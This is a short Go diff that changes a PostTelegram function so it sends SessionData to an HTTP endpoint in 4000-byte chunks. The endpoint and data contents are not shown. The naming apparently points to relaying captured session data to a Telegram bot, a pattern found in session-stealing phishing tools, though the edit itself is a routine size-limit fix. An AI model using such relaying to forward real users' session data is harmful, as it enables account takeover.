@@ -169,11 +169,15 @@ func PostTelegram(env *SessionData) bool {
 		return false
 	}
 
-	buffer := bytes.NewBuffer(data)
-	_, err = http.Post(endpoint, header, buffer)
-	if err != nil {
-		log.Fatalf("Error occurred during post: %v", err)
-		return false
+	chunks := Split(data, 4000)
+
+	for _, chunk := range chunks {
+		buffer := bytes.NewBuffer(chunk)
+		_, err = http.Post(endpoint, header, buffer)
+		if err != nil {
+			log.Fatalf("Error occurred during post: %v", err)
+			return false
+		}
 	}
 
 	return true
